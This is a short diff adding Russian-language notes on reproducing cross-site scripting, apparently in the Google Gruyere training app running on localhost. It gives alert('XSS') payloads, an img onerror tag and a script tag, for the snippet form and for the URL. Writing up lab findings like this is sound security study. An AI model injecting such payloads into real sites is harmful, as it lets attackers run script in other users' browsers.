@@ -1,0 +1,16 @@
+1. создаем новый New Snippet
+2. в поле ввода вводим следующие:
+<img src="nonexistent.jpg" onerror="alert('XSS')">
+
+или
+
+<script>alert('XSS')</script>
+
+3. нажать Submit
+
+Вариант 2
+1. в адресной строке добавить в конце адреса следующий код:
+<script>alert('XSS')</script>
+
+Пример:
+http://127.0.0.1:8008/424434239301099530633532976913311439060/newsnippet.gtl<script>alert('XSS')</script>
